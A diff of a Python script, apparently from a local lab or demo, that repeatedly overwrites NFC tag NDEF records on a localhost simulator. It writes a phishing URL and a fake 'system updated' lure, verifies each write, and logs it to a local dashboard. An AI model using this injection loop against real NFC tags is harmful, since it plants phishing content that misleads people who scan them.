@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 import socket, json
+import time
 import ndef
 from colorama import Fore, init
+import requests
+from datetime import datetime
+
 init(autoreset=True)
 
 NFC_HOST = '127.0.0.1'
@@ -17,6 +21,15 @@ PAYLOADS = {
     'malicious_text': ('TEXT', 'He thong da cap nhat. Truy cap: bit.ly/fake'),
 }
 
+def send_to_dashboard(proto, msg, cls):
+    try:
+        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+        requests.post('http://127.0.0.1:8080/api/log', json={
+            't': now, 'proto': proto, 'msg': msg, 'cls': cls
+        }, timeout=0.5)
+    except:
+        pass
+
 def make_payload(ptype: str) -> bytes:
     if ptype == 'phishing_url':
         r = ndef.UriRecord(PAYLOADS['phishing_url'][1])
@@ -28,6 +41,7 @@ def make_payload(ptype: str) -> bytes:
 
 def inject(ptype: str):
     ndef_bytes = make_payload(ptype)
+    send_to_dashboard('NFC', f'NDEF INJECTED payload: {ptype}', 'INJECT')
     s = socket.socket()
     s.settimeout(3)
     s.connect((NFC_HOST, NFC_PORT))
@@ -49,3 +63,21 @@ for ptype in ['phishing_url', 'malicious_text']:
     verify = json.loads(s.recv(2048).decode())
     s.close()
     print(f'{Fore.RED}[VERIFY] New NDEF: {verify["records"]}\n')
+
+print(f'{Fore.RED}=== NFC NDEF Injection Attack ===\n')
+
+while True:  # Thêm vòng lặp vô hạn
+    for ptype in ['phishing_url', 'malicious_text']:
+        print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
+        x = inject(ptype)
+        print(f'{Fore.RED}[INJECT] Result: {x}')
+        
+        # Xác minh: đọc lại tag
+        s = socket.socket(); s.settimeout(2)
+        s.connect((NFC_HOST, NFC_PORT))
+        s.send(json.dumps({'cmd': 'READ_NDEF'}).encode())
+        verify = json.loads(s.recv(2048).decode()); s.close()
+        print(f'{Fore.RED}[VERIFY] New NDEF: {verify["records"]}\n')
+        
+    print("Đang đợi 5 giây để ghi đè tiếp...")
+    time.sleep(5)
